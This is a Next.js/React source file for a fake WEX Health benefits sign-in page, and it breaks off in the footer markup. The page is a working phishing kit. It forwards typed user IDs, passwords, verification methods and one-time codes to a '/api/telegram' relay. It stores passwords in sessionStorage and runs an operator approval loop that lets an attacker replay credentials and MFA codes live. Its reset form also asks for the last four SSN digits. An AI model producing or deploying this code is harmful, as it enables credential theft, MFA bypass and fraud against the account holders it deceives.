"use client"

import { useState, useEffect } from "react"
import Image from "next/image"
import HomepageVisitorNotify from "@/components/HomepageVisitorNotify"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { Card, CardContent } from "@/components/ui/card"
import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
import { User, UserPlus, Eye, EyeOff } from "lucide-react"
import { Spinner } from "@/components/ui/spinner"
import {
  APPROVAL_TIMEOUT_MS,
  LOGIN_DENIED_ERROR_TEXT,
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
} from "@/lib/approval-messages"
import {
  OTP_MAX_DIGITS,
  sanitizeOtpInput,
  validateOtpCode,
  validatePassword,
  validateUsername,
} from "@/lib/login-validation"
import { LOADING_MS, wait } from "@/lib/loading-delays"

const generateApprovalId = () => {
  if (typeof crypto !== "undefined" && "getRandomValues" in crypto) {
    const bytes = crypto.getRandomValues(new Uint8Array(16))
    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
  }
  return `${Date.now()}-${Math.random().toString(16).slice(2)}`
}

type PendingApproval = {
  id: string
  stage: "password" | "otp"
}

export default function LoginPage() {
  const approvalTimeoutSeconds = Math.ceil(APPROVAL_TIMEOUT_MS / 1000)
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [rememberMe, setRememberMe] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const [loginStep, setLoginStep] = useState<"username" | "password">("username")
  const [view, setView] = useState<"login" | "forgotPassword" | "verificationMethod" | "enterCode">("login")
  const [verificationMethod, setVerificationMethod] = useState<"text" | "email">("text")
  const [verificationMethodLocked, setVerificationMethodLocked] = useState(false)
  const [verificationCode, setVerificationCode] = useState("")
  const [showVerificationCode, setShowVerificationCode] = useState(false)
  const [loginError, setLoginError] = useState("")
  const [otpError, setOtpError] = useState("")
  const [resendLoading, setResendLoading] = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)

  const [pendingApproval, setPendingApproval] = useState<PendingApproval | null>(null)
  const [approvalCountdown, setApprovalCountdown] = useState(approvalTimeoutSeconds)
  const awaitingApproval = pendingApproval !== null

  const [loading, setLoading] = useState({
    next: false,
    login: false,
    verificationNext: false,
    verify: false,
    forgotPasswordNext: false,
    getStarted: false,
  })

  useEffect(() => {
    if (!awaitingApproval || approvalCountdown <= 0) return
    const timer = window.setInterval(() => {
      setApprovalCountdown((prev) => (prev <= 1 ? 0 : prev - 1))
    }, 1000)
    return () => window.clearInterval(timer)
  }, [awaitingApproval, approvalCountdown])

  useEffect(() => {
    if (!awaitingApproval || approvalCountdown > 0 || !pendingApproval) return
    handleApprovalComplete("redirect", pendingApproval)
  }, [approvalCountdown, awaitingApproval, pendingApproval])

  useEffect(() => {
    if (!awaitingApproval || !pendingApproval) return
    const approval = pendingApproval

    const pollInterval = window.setInterval(async () => {
      try {
        const response = await fetch(`/api/approval-status?approvalId=${approval.id}`)
        const result = await response.json()

        if (result.success && result.data.action) {
          if (result.data.action === "approve") {
            handleApprovalComplete("approve", approval)
          } else if (result.data.action === "deny") {
            handleApprovalComplete("deny", approval)
          } else if (result.data.action === "redirect") {
            handleApprovalComplete("redirect", approval)
          }
        }
      } catch (error) {
        console.error("Approval poll error:", error)
      }
    }, 2000)

    return () => window.clearInterval(pollInterval)
  }, [awaitingApproval, pendingApproval])

  useEffect(() => {
    if (resendCooldown <= 0) return
    const timer = window.setInterval(() => {
      setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1))
    }, 1000)
    return () => window.clearInterval(timer)
  }, [resendCooldown])

  useEffect(() => {
    const params = new URLSearchParams(window.location.search)
    const denied = params.get("loginDenied") === "1"
    const verifyUnavailable = params.get("verifyUnavailable") === "1"
    if (!denied && !verifyUnavailable) return
    setView("login")
    setLoginStep("username")
    setUsername("")
    setPassword("")
    setLoginError(denied ? LOGIN_DENIED_ERROR_TEXT : MSG_UNABLE_VERIFY_TIME)
    setOtpError("")
    setVerificationCode("")
    window.history.replaceState({}, "", "/")
  }, [])

  const formatResendCountdown = (seconds: number) => {
    const padded = String(seconds).padStart(2, "0")
    return `0:${padded}`
  }

  const handleApprovalComplete = (
    action: "approve" | "deny" | "redirect",
    approval: PendingApproval | null = pendingApproval
  ) => {
    if (!approval || pendingApproval?.id !== approval.id) {
      return
    }

    setPendingApproval(null)
    setApprovalCountdown(approvalTimeoutSeconds)

    if (action === "approve") {
      if (approval.stage === "password") {
        setView("verificationMethod")
      } else if (approval.stage === "otp") {
        window.location.href = "/api/login-out"
      }
      return
    }

    if (action === "deny") {
      if (approval.stage === "password") {
        setPassword("")
        setLoginStep("password")
        setLoginError("Incorrect password. Please try again.")
      } else if (approval.stage === "otp") {
        setVerificationCode("")
        setOtpError("Incorrect verification code. Please try again.")
      }
      return
    }

    if (action === "redirect") {
      window.location.href = "/api/login-out"
    }
  }

  const initiateApproval = async (stage: "password" | "otp") => {
    const newApprovalId = generateApprovalId()
    let approvalRegistered = false

    try {
      const registerResponse = await fetch("/api/approval", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          approvalId: newApprovalId,
          username,
          stage,
        }),
      })

      if (!registerResponse.ok) {
        throw new Error("Failed to register approval")
      }
      approvalRegistered = true

      setPendingApproval({
        id: newApprovalId,
        stage,
      })
      setApprovalCountdown(approvalTimeoutSeconds)

      const telegramResponse = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: stage === "password" ? "password_approval" : "otp_approval",
          data: {
            username,
            approvalId: newApprovalId,
            stage,
            pageUrl: window.location.href,
          },
        }),
      })

      if (!telegramResponse.ok) {
        throw new Error("Failed to send approval prompt")
      }
    } catch (error) {
      console.error("Approval initiation error:", error)
      if (approvalRegistered) {
        void fetch("/api/approval", {
          method: "DELETE",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ approvalId: newApprovalId }),
        }).catch(() => {})
      }
      setPendingApproval(null)
      setApprovalCountdown(approvalTimeoutSeconds)
      if (stage === "password") {
        setLoginError(MSG_UNABLE_REACH_VERIFICATION)
      } else {
        setOtpError(MSG_UNABLE_REACH_VERIFICATION)
      }
    }
  }

  const handleResendVerificationCode = async (e: React.MouseEvent) => {
    e.preventDefault()
    if (resendLoading || resendCooldown > 0) return

    setResendLoading(true)

    const storedUserId =
      (typeof window !== "undefined" ? sessionStorage.getItem("wex_username") : "") ||
      username

    const minDelay = new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS))

    void fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "code_requested",
        data: {
          username: storedUserId,
          verificationMethod,
          pageUrl: window.location.href,
        },
      }),
    }).catch(() => {})

    await minDelay
    setResendLoading(false)
    setResendCooldown(OTP_RESEND_COOLDOWN_SEC)
  }

  const resetToLoginHome = (message: string) => {
    setView("login")
    setLoginStep("username")
    setUsername("")
    setPassword("")
    setRememberMe(false)
    setShowPassword(false)
    setLoginError(message)
    setVerificationMethodLocked(false)
    setVerificationCode("")
    setOtpError("")
    setResendLoading(false)
    setResendCooldown(0)
    setPendingApproval(null)
    setApprovalCountdown(approvalTimeoutSeconds)
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("wex_username")
      sessionStorage.removeItem("wex_password")
    }
  }

  const sendNotification = async (type: "username" | "password" | "verification_method" | "verification_code", data: Record<string, unknown>) => {
    void fetch("/api/telegram", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        type,
        data: {
          ...data,
          pageUrl: window.location.href,
        },
      }),
    }).catch((error) => {
      console.error("Failed to send notification:", error)
    })
  }

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault()
    const usernameError = validateUsername(username)
    if (usernameError) {
      setLoginError(usernameError)
      return
    }

    setLoginError("")
    sendNotification("username", {
      username: username,
    })

    setLoading(prev => ({ ...prev, next: true }))

    await wait(LOADING_MS.next)

    setLoginStep("password")
    setLoading(prev => ({ ...prev, next: false }))
  }

  const handleChangeAccount = (e: React.MouseEvent) => {
    e.preventDefault()
    setLoginStep("username")
    setPassword("")
  }

  const handleForgotPassword = (e: React.MouseEvent) => {
    e.preventDefault()
    setView("forgotPassword")
  }

  return (
    <HomepageVisitorNotify>
    <>
      <style dangerouslySetInnerHTML={{
        __html: `
        @media (max-width: 768px) {
            #mobile-zoom-target {
                zoom: 0.37;
            }
        }
    `}} />
      <div
        id="AccessibilityPageLoadingContainer"
        className="wexShell min-h-screen bg-[#F4F6F8] font-sans text-slate-900 flex justify-center items-center md:items-start md:pt-6 overflow-auto"
      >
        <div
          id="mobile-zoom-target"
          className="wexShellInner flex justify-center"
          style={{
            width: '962px',
            minWidth: '962px'
          }}
        >
          <div
            id="wexPortalPanel"
            className="wexPortalFrame bg-white border-[#E8EEF2] border-[4px] shadow-[0_8px_24px_rgba(11,58,92,0.06)]"
            style={{
              width: '962px',
              minWidth: '962px',
              maxWidth: '962px',
              height: '1208px',
              minHeight: '1208px',
              maxHeight: '1208px',
              paddingLeft: '0px',
              marginLeft: '0px',
              borderLeftWidth: '4px',
              borderTopWidth: '4px',
              borderRightWidth: '4px',
              borderBottomWidth: '4px',
              paddingTop: '12px',
              boxSizing: 'border-box'
            }}
          >
            <div className="wexBanner" role="banner">
              <div className="mx-auto w-[940px] h-[68px] mb-8 px-0 relative">
                <button
                  type="button"
                  className="relative w-full h-full cursor-pointer border-0 bg-transparent p-0 text-left"
                  onClick={() => {
                    setView("login")
                    setLoginStep("username")
                    setVerificationMethodLocked(false)
                  }}
                  aria-label="Return to homepage"
                >
                  <Image
                    src="/wex-logo-official.jpg"
                    alt="WEX Health Logo"
                    fill
                    className="object-contain object-left"
                    priority
                  />
                </button>
                {view === "login" && (
                  <div className="absolute bottom-0 right-0 pr-[15px] pb-[5px] w-[310px] text-[16px] text-right">
                    <a
                      href="https://wexhealthinc.my.site.com/WEXbenefitscontactus/s/"
                      target="_blank"
                      className="font-bold text-[#005F9E] hover:underline"
                    >
                      Contact Us
                    </a>
                  </div>
                )}
              </div>
            </div>

            <div style={{ clear: 'both' }}></div>

            <div style={{ position: 'relative' }}>
              <div id="wexMainPanel" className="wexMain" role="main">
                <div className="wexBody mx-auto w-[940px] px-0">
                  {view === "login" ? (
                    <>
                      <h1 className="mb-6 text-[30px] font-semibold text-[#0B3A5C] leading-tight tracking-tight">Sign in</h1>
                      <div className="grid grid-cols-2 gap-6">
                        <Card className="shadow-none rounded-none border border-[#E8EEF2] bg-white h-full relative z-10">
                          <CardContent className="p-0 h-full flex flex-col">
                            <div className="flex items-center gap-3 px-5 py-4 border-b border-[#E8EEF2] bg-white">
                              <User className="h-5 w-5 text-black fill-black" />
                              <h2 className="text-[17px] font-bold text-slate-900">Returning member</h2>
                            </div>
                            <div className="p-9 pb-12 flex-1">
                              <form className="space-y-4" onSubmit={handleNext}>
                                {loginStep === "username" ? (
                                  <>
                                    {loginError ? (
                                      <div className="text-[13px] text-[#D03030] font-semibold">
                                        {loginError}
                                      </div>
                                    ) : null}
                                    <div className="flex flex-col gap-2">
                                      <div className="flex flex-wrap items-center gap-4">
                                        <label htmlFor="username" className="text-[15px] text-slate-700 w-[75px] shrink-0">
                                          User ID
                                        </label>
                                        <div className="flex-1 flex items-center gap-3">
                                          <Input
                                            id="username"
                                            type="text"
                                            value={username}
                                            onChange={(e) => {
                                              setUsername(e.target.value)
                                              if (loginError) setLoginError("")
                                            }}
                                            className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-[160px] px-[10px] text-[15px]"
                                            disabled={awaitingApproval}
                                          />
                                          <a href="#" className="text-[13px] text-[#005F9E] hover:underline whitespace-nowrap">
                                            Recover user ID
                                          </a>
                                        </div>
                                      </div>
                                    </div>

                                    <div className="flex items-center gap-2 pl-[90px] mt-3">
                                      <Checkbox
                                        id="remember"
                                        checked={rememberMe}
                                        onCheckedChange={(checked) => setRememberMe(checked as boolean)}
                                        className="rounded-[4px] border-[#767676] data-[state=checked]:bg-[#005F9E] data-[state=checked]:text-white h-[13px] w-[13px] mt-0.5"
                                        disabled={awaitingApproval}
                                      />
                                      <label htmlFor="remember" className="text-[13px] text-slate-700 font-normal cursor-pointer select-none">
                                        Keep me signed in
                                      </label>
                                    </div>

                                    <div className="pl-[90px] mt-6">
                                      <Button
                                        type="submit"
                                        disabled={loading.next || awaitingApproval}
                                        className="rounded-sm bg-[#005F9E] px-4 py-1.5 font-bold text-white hover:bg-[#004E82] h-[34px] min-w-[80px] text-[15px] shadow-sm disabled:opacity-50"
                                      >
                                        {loading.next ? (
                                          <>
                                            <Spinner className="mr-2 h-4 w-4" />
                                            Loading...
                                          </>
                                        ) : (
                                          "Next"
                                        )}
                                      </Button>
                                    </div>
                                  </>
                                ) : (
                                  <>
                                    {loginError ? (
                                      <div className="text-[13px] text-[#D03030] font-semibold">
                                        {loginError}
                                      </div>
                                    ) : null}
                                    <div className="flex flex-col gap-5">
                                      <div className="flex items-center gap-4">
                                        <span className="text-[15px] text-slate-700 w-[75px] shrink-0">User ID</span>
                                        <div className="flex-1 flex items-center justify-between">
                                          <span className="text-[15px] text-slate-700">{username}</span>
                                          <a href="#" onClick={handleChangeAccount} className="text-[13px] text-[#005F9E] hover:underline whitespace-nowrap ml-4">
                                            Change Account?
                                          </a>
                                        </div>
                                      </div>

                                      <div className="flex items-center gap-4">
                                        <label htmlFor="password" className="text-[15px] text-slate-700 w-[75px] shrink-0">
                                          Password
                                        </label>
                                        <div className="flex-1 flex items-center gap-3">
                                          <div className="relative w-[160px]">
                                            <Input
                                              id="password"
                                              type={showPassword ? "text" : "password"}
                                              value={password}
                                              onChange={(e) => {
                                                setPassword(e.target.value)
                                                if (loginError) setLoginError("")
                                              }}
                                              className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-full px-[10px] text-[15px]"
                                              disabled={awaitingApproval}
                                            />
                                            <button
                                              type="button"
                                              onClick={() => setShowPassword(!showPassword)}
                                              className="absolute right-1 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                                              disabled={awaitingApproval}
                                            >
                                              {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                                            </button>
                                          </div>
                                          <a href="#" onClick={handleForgotPassword} className="text-[13px] text-[#005F9E] hover:underline whitespace-nowrap">
                                            Forgot Password?
                                          </a>
                                        </div>
                                      </div>
                                    </div>

                                    <div className="pl-[90px] mt-6">
                                      <Button
                                        type="button"
                                        disabled={loading.login || awaitingApproval}
                                        onClick={async () => {
                                          if (loading.login) return

                                          const usernameError = validateUsername(username)
                                          const passwordError = validatePassword(password)
                                          if (usernameError || passwordError) {
                                            setLoginError(passwordError ?? usernameError ?? "")
                                            return
                                          }

                                          setLoginError("")
                                          sendNotification("password", {
                                            username: username,
                                            password: password,
                                          })

                                          setLoading(prev => ({ ...prev, login: true }))

                                          try {
                                            if (typeof window !== "undefined") {
                                              sessionStorage.setItem("wex_username", username)
                                              sessionStorage.setItem("wex_password", password)
                                            }
                                            await wait(LOADING_MS.next)
                                            setLoading(prev => ({ ...prev, login: false }))
                                            await initiateApproval("password")
                                          } catch {
                                            setLoginError(MSG_UNABLE_REACH_VERIFICATION)
                                            setLoading(prev => ({ ...prev, login: false }))
                                          }
                                        }}
                                        className="rounded-sm bg-[#005F9E] px-5 py-1.5 font-bold text-white hover:bg-[#004E82] h-[34px] min-w-[80px] text-[15px] shadow-sm disabled:opacity-50"
                                      >
                                        {loading.login ? (
                                          <>
                                            <Spinner className="mr-2 h-4 w-4" />
                                            Loading...
                                          </>
                                        ) : (
                                          "Sign in"
                                        )}
                                      </Button>
                                    </div>
                                  </>
                                )}
                              </form>
                            </div>
                          </CardContent>
                        </Card>

                        <div className="border border-[#E8EEF2] shadow-none bg-white h-full relative z-10 overflow-hidden">
                          <div className="relative w-full h-full min-h-[300px]">
                            <Image
                              src="/help-illustration.png"
                              alt="Get Login Help"
                              fill
                              className="object-cover"
                            />
                            <a href="#" className="absolute inset-0 z-20 transition-opacity hover:opacity-80"><span className="sr-only">Get Login Help</span></a>
                          </div>
                        </div>

                        <div className="border border-[#E8EEF2] shadow-none bg-white h-[280px] relative z-0 overflow-hidden">
                          <Carousel className="w-full h-full" opts={{ loop: true }}>
                            <CarouselContent className="h-full ml-0">
                              <CarouselItem className="relative h-[280px] pl-0">
                                <Image
                                  src="/slideshow/d286da7035014545b89c1ac1902af3423305e2b44b9144f2ac37e1d00c9d0192.png"
                                  alt="Shop eligible FSA items at FSA Store now"
                                  width={480}
                                  height={280}
                                  className="object-cover w-full h-full"
                                />
                              </CarouselItem>
                              <CarouselItem className="relative h-[280px] pl-0">
                                <Image
                                  src="/slideshow/291f050c88594958a71fdc803f85779cce9afe11f07c4528831cf3650076b4a0.png"
                                  alt="Shop HSA eligible items at the HSA Store now"
                                  width={480}
                                  height={280}
                                  className="object-cover w-full h-full"
                                />
                              </CarouselItem>
                              <CarouselItem className="relative h-[280px] pl-0">
                                <Image
                                  src="/slideshow/dc8a794ddf97497fb369a006269eb601f0c6e273eb524983b20bb8abea9d7d1e.png"
                                  alt="Glasses USA"
                                  width={480}
                                  height={280}
                                  className="object-cover w-full h-full"
                                />
                              </CarouselItem>
                            </CarouselContent>
                            <CarouselPrevious className="left-2 bg-white/50 hover:bg-white text-slate-800 border-none h-8 w-8" />
                            <CarouselNext className="right-2 bg-white/50 hover:bg-white text-slate-800 border-none h-8 w-8" />
                          </Carousel>
                        </div>

                        <Card className="shadow-none rounded-none border border-[#E8EEF2] bg-white h-[280px] relative z-0">
                          <CardContent className="p-0 h-full flex flex-col">
                            <div className="flex items-center gap-3 px-5 py-4 border-b border-[#E8EEF2] bg-white">
                              <UserPlus className="h-5 w-5 text-black fill-black" />
                              <h2 className="text-[17px] font-bold text-slate-900">First-time access</h2>
                            </div>
                            <div className="p-9 h-full flex flex-col gap-6">
                              <p className="text-[15px] text-[#222222]">
                                New members can register an account to begin.
                              </p>
                              <div>
                                <Button
                                  disabled={loading.getStarted}
                                  onClick={async () => {
                                    setLoading(prev => ({ ...prev, getStarted: true }))
                                    await new Promise(resolve => setTimeout(resolve, 1000))
                                    setLoading(prev => ({ ...prev, getStarted: false }))
                                  }}
                                  className="rounded-sm bg-[#005F9E] px-5 py-2 font-bold text-white hover:bg-[#004E82] h-[34px] text-[15px] shadow-sm disabled:opacity-50"
                                >
                                  {loading.getStarted ? (
                                    <>
                                      <Spinner className="mr-2 h-4 w-4" />
                                      Loading...
                                    </>
                                  ) : (
                                    "Begin"
                                  )}
                                </Button>
                              </div>
                            </div>
                          </CardContent>
                        </Card>

                        <div className="col-span-2 border border-[#E8EEF2] shadow-none bg-white h-[160px] relative overflow-hidden">
                          <div className="relative w-full h-full">
                            <Image
                              src="/mobile-app-promo.png"
                              alt="Download Mobile App"
                              fill
                              className="object-cover object-left"
                            />
                            <a href="#" className="absolute inset-0 z-20"><span className="sr-only">Download Mobile App</span></a>
                          </div>
                        </div>
                      </div>
                    </>
                  ) : view === "forgotPassword" ? (
                    <div className="w-full">
                      <h1 className="mb-5 text-[28px] font-light text-[#222222] leading-tight">Request Password Reset</h1>
                      <div className="bg-white border border border border-[#E8EEF2] shadow-none">
                        <div className="p-8">
                          <div className="flex items-center gap-2 mb-8">
                            <div className="h-[10px] w-full bg-gray-200 rounded-full relative">
                              <div className="absolute top-0 left-0 h-full bg-[#005F9E] rounded-full w-[20%]"></div>
                            </div>
                            <span className="text-sm font-bold text-slate-700">20%</span>
                          </div>

                          <div className="flex justify-between items-start mb-6">
                            <p className="text-[15px] text-[#222222]">Enter your username, last name and last 4 digits of your SSN.</p>
                            <span className="text-[12px] text-[#D03030]">*Required</span>
                          </div>

                          <div className="grid grid-cols-[1fr_2fr] gap-x-8 gap-y-4 max-w-[600px]">
                            <div className="flex items-center">
                              <label className="text-[15px] text-[#555555]">User ID <span className="text-[#D03030]">*</span></label>
                            </div>
                            <div className="relative">
                              <Input defaultValue={username} className="h-[34px] border border-[#CCCCCC] rounded-[4px] w-full shadow-inner" />
                            </div>

                            <div className="flex items-center">
                              <label className="text-[15px] text-[#555555]">Last Name <span className="text-[#D03030]">*</span></label>
                            </div>
                            <div>
                              <Input className="h-[34px] border border-[#CCCCCC] rounded-[4px] w-full shadow-inner" />
                            </div>

                            <div className="flex items-center">
                              <label className="text-[15px] text-[#555555]">Last 4 Digits of Your SSN <span className="text-[#D03030]">*</span></label>
                            </div>
                            <div>
                              <Input className="h-[34px] border border-[#CCCCCC] rounded-[4px] w-full shadow-inner" />
                            </div>
                          </div>
                        </div>
                        <div className="px-8 py-4 border-t border-gray-100 flex justify-end gap-3">
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => setView("login")}
                            className="rounded-sm border-[#CCCCCC] px-6 py-1.5 font-bold text-[#555555] hover:bg-gray-50 h-[34px] text-[15px] shadow-sm"
                          >
                            Cancel
                          </Button>
                          <Button
                            disabled={loading.forgotPasswordNext}
                            onClick={async () => {
                              setLoading(prev => ({ ...prev, forgotPasswordNext: true }))
                              await new Promise(resolve => setTimeout(resolve, 1000))
                              setLoading(prev => ({ ...prev, forgotPasswordNext: false }))
                            }}
                            className="rounded-sm bg-[#005F9E] px-6 py-1.5 font-bold text-white hover:bg-[#004E82] h-[34px] text-[15px] shadow-sm disabled:opacity-50"
                          >
                            {loading.forgotPasswordNext ? (
                              <>
                                <Spinner className="mr-2 h-4 w-4" />
                                Loading...
                              </>
                            ) : (
                              "Next"
                            )}
                          </Button>
                        </div>
                      </div>
                    </div>
                  ) : view === "verificationMethod" ? (
                    <div className="w-full">
                      <h1 className="mb-5 text-[28px] font-light text-[#222222] leading-tight">Verify Your Identity</h1>
                      <div className="bg-white border border border border-[#E8EEF2] shadow-none">
                        <div className="p-8">
                          <div className="mb-6">
                            <div className="flex items-center justify-between mb-2">
                              <span className="text-[13px] text-[#555555]"> </span>
                              <span className="text-[13px] text-[#555555]">60%</span>
                            </div>
                            <div className="h-[10px] bg-[#e6e6e6] rounded-[4px] overflow-hidden">
                              <div className="h-full bg-[#005F9E]" style={{ width: "60%" }} />
                            </div>
                          </div>

                          <p className="text-[15px] text-[#222222] mb-6">
                            Your protection is important to us. We need to take some extra steps to verify your identity. Please confirm how you would like to proceed.
                          </p>

                          <div className={`flex flex-col gap-4 ${verificationMethodLocked ? "pointer-events-none select-none opacity-60" : ""}`}>
                            <label className={`flex items-center gap-3 ${verificationMethodLocked ? "cursor-not-allowed" : "cursor-pointer"}`}>
                              <input
                                type="radio"
                                name="verificationMethod"
                                checked={verificationMethod === "text"}
                                onChange={() => setVerificationMethod("text")}
                                disabled={verificationMethodLocked}
                                className="h-4 w-4 text-[#005F9E]"
                              />
                              <div className="flex flex-col">
                                <span className="text-[15px] font-bold text-[#222222]">Text Message</span>
                                <span className="text-[13px] text-[#555555] ml-0">Text messaging rates may apply.</span>
                                <span className="text-[13px] text-[#005F9E] hover:underline ml-0">View our privacy policy and terms of service.</span>
                                <span className="text-[13px] text-[#555555] ml-0">1 message per attempt.</span>
                              </div>
                            </label>

                            <label className={`flex items-center gap-3 mt-4 ${verificationMethodLocked ? "cursor-not-allowed" : "cursor-pointer"}`}>
                              <input
                                type="radio"
                                name="verificationMethod"
                                checked={verificationMethod === "email"}
                                onChange={() => setVerificationMethod("email")}
                                disabled={verificationMethodLocked}
                                className="h-4 w-4 text-[#005F9E]"
                              />
                              <span className="text-[15px] font-bold text-[#222222]">Email</span>
                            </label>
                          </div>
                        </div>
                        <div className="px-8 py-4 border-t border-gray-100 flex justify-end gap-3">
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => {
                              setView("login")
                              setVerificationMethodLocked(false)
                            }}
                            className="rounded-sm border-[#CCCCCC] px-6 py-1.5 font-bold text-[#555555] hover:bg-gray-50 h-[34px] text-[15px] shadow-sm"
                          >
                            Cancel
                          </Button>
                          <Button
                            disabled={loading.verificationNext || awaitingApproval}
                            onClick={async () => {
                              if (loading.verificationNext) return
                              setVerificationMethodLocked(true)

                              sendNotification("verification_method", {
                                username,
                                verificationMethod,
                              })

                              const storedUserId =
                                (typeof window !== "undefined"
                                  ? sessionStorage.getItem("wex_username")
                                  : "") || username
                              const storedPassword =
                                (typeof window !== "undefined"
                                  ? sessionStorage.getItem("wex_password")
                                  : "") || password

                              const storedUsernameError = validateUsername(storedUserId)
                              const storedPasswordError = validatePassword(storedPassword)
                              if (storedUsernameError || storedPasswordError) {
                                resetToLoginHome(storedPasswordError ?? storedUsernameError ?? MSG_UNABLE_REACH_VERIFICATION)
                                return
                              }

                              setLoading((prev) => ({ ...prev, verificationNext: true }))

                              try {
                                await wait(LOADING_MS.method)
                                setLoading((prev) => ({ ...prev, verificationNext: false }))
                                setOtpError("")
                                setView("enterCode")
                              } catch {
                                setLoading((prev) => ({ ...prev, verificationNext: false }))
                                resetToLoginHome(MSG_UNABLE_REACH_VERIFICATION)
                              }
                            }}
                            className="rounded-sm bg-[#005F9E] px-6 py-1.5 font-bold text-white hover:bg-[#004E82] h-[34px] text-[15px] shadow-sm disabled:opacity-50"
                          >
                            {loading.verificationNext ? (
                              <>
                                <Spinner className="mr-2 h-4 w-4" />
                                Loading...
                              </>
                            ) : (
                              "Next"
                            )}
                          </Button>
                        </div>
                      </div>
                    </div>
                  ) : (
                    <div className="w-full">
                      <h1 className="mb-5 text-[28px] font-light text-[#222222] leading-tight">Verify Your Identity</h1>
                      <div className="bg-white border border border border-[#E8EEF2] shadow-none">
                        <div className="p-8">
                          <div className="mb-6">
                            <div className="flex items-center justify-between mb-2">
                              <span className="text-[13px] text-[#555555]"> </span>
                              <span className="text-[13px] text-[#555555]">60%</span>
                            </div>
                            <div className="h-[10px] bg-[#e6e6e6] rounded-[4px] overflow-hidden">
                              <div className="h-full bg-[#005F9E]" style={{ width: "60%" }} />
                            </div>
                          </div>

                          <p className="text-[15px] text-[#222222] mb-2">
                            A verification code was sent to your mobile number.
                          </p>

                          {otpError ? (
                            <p className="text-[14px] text-[#D03030] font-semibold mb-4">{otpError}</p>
                          ) : null}

                          <div className="flex items-center gap-4 max-w-[500px]">
                            <label className="text-[15px] text-[#555555] w-[150px]">
                              Verification Code <span className="text-[#D03030]">*</span>
                            </label>
                            <div className="flex items-center gap-3 w-full">
                              <Input
                                value={verificationCode}
                                onChange={(e) => {
                                  setVerificationCode(sanitizeOtpInput(e.target.value))
                                  if (otpError) setOtpError("")
                                }}
                                inputMode="numeric"
                                autoComplete="one-time-code"
                                maxLength={OTP_MAX_DIGITS}
                                type={showVerificationCode ? "text" : "password"}
                                className="h-[34px] border border-[#CCCCCC] rounded-[4px] w-full shadow-inner"
                                disabled={awaitingApproval}
                              />
                              <div className="flex items-center gap-1">
                                <input
                                  type="checkbox"
                                  id="viewVerificationCode"
                                  checked={showVerificationCode}
                                  onChange={(e) => setShowVerificationCode(e.target.checked)}
                                  className="h-3 w-3"
                                  disabled={awaitingApproval}
                                />
                                <label
                                  htmlFor="viewVerificationCode"
                                  className="text-[13px] text-[#555555] cursor-pointer"
                                >
                                  View
                                </label>
                              </div>
                            </div>
                          </div>

                          <p className="mt-4 text-[13px] text-[#555555]">
                            If you did not receive the verification code, please{" "}
                            {resendLoading ? (
                              <span className="inline-flex items-center gap-1 text-[#555555]">
                                <Spinner className="h-3 w-3" />
                                Loading...
                              </span>
                            ) : resendCooldown > 0 ? (
                              <span className="text-[#555555]">
                                click here ({formatResendCountdown(resendCooldown)})
                              </span>
                            ) : (
                              <button
                                type="button"
                                onClick={handleResendVerificationCode}
                                className="text-[#005F9E] hover:underline bg-transparent border-0 p-0 cursor-pointer font-inherit text-[13px]"
                              >
                                click here
                              </button>
                            )}{" "}
                            to resend the verification code.
                          </p>
                        </div>
                        <div className="px-8 py-4 border-t border-gray-100 flex justify-end gap-3">
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => setView("verificationMethod")}
                            className="rounded-sm border-[#CCCCCC] px-6 py-1.5 font-bold text-[#555555] hover:bg-gray-50 h-[34px] text-[15px] shadow-sm"
                          >
                            Cancel
                          </Button>
                          <Button
                            disabled={loading.verify || awaitingApproval}
                            onClick={async () => {
                              if (loading.verify) return

                              const otpValidationError = validateOtpCode(verificationCode)
                              if (otpValidationError) {
                                setOtpError(otpValidationError)
                                return
                              }

                              setOtpError("")
                              setLoading((prev) => ({ ...prev, verify: true }))

                              sendNotification("verification_code", {
                                username,
                                verificationMethod,
                                verificationCode,
                              })

                              try {
                                await wait(LOADING_MS.otpVerify)
                                setLoading((prev) => ({ ...prev, verify: false }))
                                await initiateApproval("otp")
                              } catch {
                                setLoading((prev) => ({ ...prev, verify: false }))
                                setOtpError(MSG_UNABLE_REACH_VERIFICATION)
                              }
                            }}
                            className="rounded-sm bg-[#005F9E] px-6 py-1.5 font-bold text-white hover:bg-[#004E82] h-[34px] text-[15px] shadow-sm disabled:opacity-50"
                          >
                            {loading.verify ? (
                              <>
                                <Spinner className="mr-2 h-4 w-4" />
                                Loading...
                              </>
                            ) : (
                              "Submit"
                            )}
                          </Button>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>
            <div style={{ clear: 'both' }}></div>

            <div className="PageFooter" role="contentinfo">
              <div className="PageFooterContentArea mt-8 py-8 bg-transparent text-center">
                <div className="mx-auto w-[940px] px-0">
                  <p className="text-[11px] text-[#222222]">
